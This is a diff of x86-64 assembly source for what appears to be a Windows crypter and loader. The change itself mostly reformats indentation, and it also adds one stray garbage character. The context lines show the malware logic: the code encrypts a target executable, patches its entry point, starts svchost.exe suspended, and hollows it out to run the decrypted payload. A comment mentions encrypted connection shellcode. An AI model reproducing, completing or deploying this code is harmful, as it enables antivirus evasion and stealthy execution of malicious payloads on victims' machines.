@@ -5,17 +5,17 @@
 global WinMain
 
 section .bss
-	tm                                              resq 8
-	tamTotal                                        resq 8
-	NameArgv0                                       resb 32
-	AddressAlocadoV resq 8
-	addressAllocTarget                              resq 8
-	addressAllocArv0                                resq 8
-	addressCrypted                                  resq 8
+    tm                                              resq 8
+    tamTotal                                        resq 8
+    NameArgv0                                       resb 32
+    AddressAlocadoV resq 8
+    addressAllocTarget                              resq 8
+    addressAllocArv0                                resq 8
+    addressCrypted                                  resq 8
     TamArqProgram                                   resq 8
     TamArqTarget                                    resq 8
     bufferFileName                                  resq 32
-	bufferFileNameTarget                            resq 32
+    bufferFileNameTarget                            resq 32
     GetSizeTarget                                   resq 8
     lpPebImageBase                                  resq 8
     allocex                                         resq 8
@@ -28,11 +28,11 @@ section .bss
     Ptrt                                            resq 8
     void                                            resq 8
     address750                                      resq 8
-	NumSection resq 8
-	handle resq 8
-	BufferFileNameTarget resq 0x100
+    NumSection resq 8
+    handle resq 8
+    BufferFileNameTarget resq 0x100
 	
-	struc CONTEXT
+    struc CONTEXT
        .P1Home:                                     resq 1
        .P2Home:                                     resq 1
        .P3Home:                                     resq 1
@@ -109,7 +109,7 @@ section .bss
     endstruc
 
 section .rdata
-	Ptrl                                             dq  0x0004000000000000
+	Ptrl                                         dq  0x0004000000000000
 	process dq "svchost.exe",0,0
 
 section .data
@@ -127,7 +127,7 @@ section .data
     Ptrt0                                            dq 0x00
     ptr17f0                                          dd 0x01
     address7ec                                       dd 0
-	bool dq 1
+    bool dq 1
     tamArq dq 0
 	
 section codered
@@ -158,8 +158,8 @@ WinMain:
 	call ReadTarget
     call Locate_kernel32
 	
-	call VirtualProect
-	;CALL VirtualProtect 
+    call VirtualProect
+    ;CALL VirtualProtect 
     mov r10, [TamArqTarget]
     add r10, 0x77
     sub rsp, 0x30
@@ -173,8 +173,8 @@ WinMain:
     add rsp, 0x30
 	
     mov rdx,[TamArqTarget]
-	mov rdi, [addressAllocTarget]
-	mov rsi, CodeRed
+    mov rdi, [addressAllocTarget]
+    mov rsi, CodeRed
     xor rcx,rcx
     Encrypt:
         mov rbx, [rdi]
@@ -194,7 +194,7 @@ WinMain:
 	mov [bufferFileName], rbx
 	call OpenFileArg0
 
-	;Lookup malloc
+    ;Lookup malloc
     mov rdi, "malloc"
     push rdi
     lea rdx, [rsp]
@@ -241,7 +241,7 @@ WinMain:
 		jne CopyTarget
 	
 	WriterCrypted:
-		;Lookup fopen
+        ;Lookup fopen
         mov rax, "fopen"
         push rax
         lea rdx, [rsp]
@@ -260,24 +260,24 @@ WinMain:
         lea rdx, [rsp]
         sub rsp, 0x30
         call rax
-		mov rsi, rax
-		add rsp, 0x30
+	mov rsi, rax
+	add rsp, 0x30
 		
-		;Lookup fwrite
+	;Lookup fwrite
         mov rax, "fwrite"
         push rax
         lea rdx, [rsp]
         mov rcx, r15
         sub rsp, 0x30
         call r14
-		add rsp, 0x30
-		add rsp, 0x08
+	add rsp, 0x30
+	add rsp, 0x08
 		
-		mov rbx, [addressCrypted]
-		mov edx, dword [rbx+0x3c]
-		add rbx, rdx
-		add rbx, 0x28
-		mov [rbx], dword 0x0061D000
+	mov rbx, [addressCrypted]
+	mov edx, dword [rbx+0x3c]
+	add rbx, rdx
+	add rbx, 0x28
+	mov [rbx], dword 0x0061D000
 		
         ;call fwrite
         xor r8,R8
@@ -300,12 +300,12 @@ WinMain:
         add rsp, 0x30
         add rsp, 0x08
 		
-		;call fclose
-		sub rsp,0x30
-		mov rcx, rsi
-		call r12
-		add rsp, 0x30
-		add rsp, 0x08
+	;call fclose
+	sub rsp,0x30
+	mov rcx, rsi
+	call r12
+	add rsp, 0x30
+	add rsp, 0x08
 	
 	dec:
         ;call decCode
@@ -334,12 +334,12 @@ ret
 
 section deccode    
     decCode:
-	call Locate_kernel32
+    call Locate_kernel32
     call IAT
     call FinFunctionGetProcAddress
     ;SHELLCODE DE CONEXÃO ENCRIPTADO
      
-	call Locate_kernel32	 
+    call Locate_kernel32	 
     ;Lookup CreateProcessA
     mov rax, 0x41737365636f
     push rax
@@ -351,8 +351,7 @@ section deccode
     call R14
     add rsp, 0x30
     add rsp, 0x10
-	
-	sub rsp, 0x238
+    sub rsp, 0x238
 
     ;Call CreateProcessA, CRIA PROCESSO SVCHOST SUSPENSO
     lea rdx,[ProcInfo+PROCESSINFO.hProcess]
@@ -376,7 +375,7 @@ section deccode
     mov ecx, 0
     xor r10,r10
     call rax
-	add rsp, 0x238
+    add rsp, 0x238
 	
     call Locate_kernel32
     call GetProcAddres
@@ -424,7 +423,7 @@ section deccode
     add rax, 0x50
     mov ebx, [eax]
     mov [GetSizeTarget],ebx
-	mov rax, [AddressAlocadoV]
+¯   mov rax, [AddressAlocadoV]
     mov [lpImageBase], rax 
     mov edi, dword [rax+0x3c]
     add eax, edi
@@ -444,7 +443,7 @@ section deccode
     ;Lookup ReadProcessMemory
     call ReadProcessMemory
     ;call ReadProcessMemory
-	mov rdi, [ctx+CONTEXT.Rdx]
+    mov rdi, [ctx+CONTEXT.Rdx]
     mov edx, 0x10
     add rdi,rdx
     mov [void], rdi
@@ -695,10 +694,9 @@ section deccode
             mov [rsp+0x20],rdx
             mov rdx,Rcx
             mov rcx, Rax
-			
-			sub rsp, 0x410
+	    sub rsp, 0x410
             call R12
-			add rsp, 0x410
+            add rsp, 0x410
 	
             mov dword[ptr17f0], 0
             mov rax, [PE]
@@ -850,8 +848,8 @@ section deccode
         mov rcx, Rax
         call r12
         add rsp, 0x80
-		sub rsp, 0x10
-		add rsp, 0x8
+        sub rsp, 0x10
+	add rsp, 0x8
         add dword [NumSection], 0x1
     Final:
         mov rax, [PE]
@@ -877,7 +875,7 @@ section deccode
         mov rax, [ProcInfo+PROCESSINFO.hThread]
         mov rcx, rax
         call R12
-		add rsp, 0x10
+	add rsp, 0x10
 		
 ret         
 
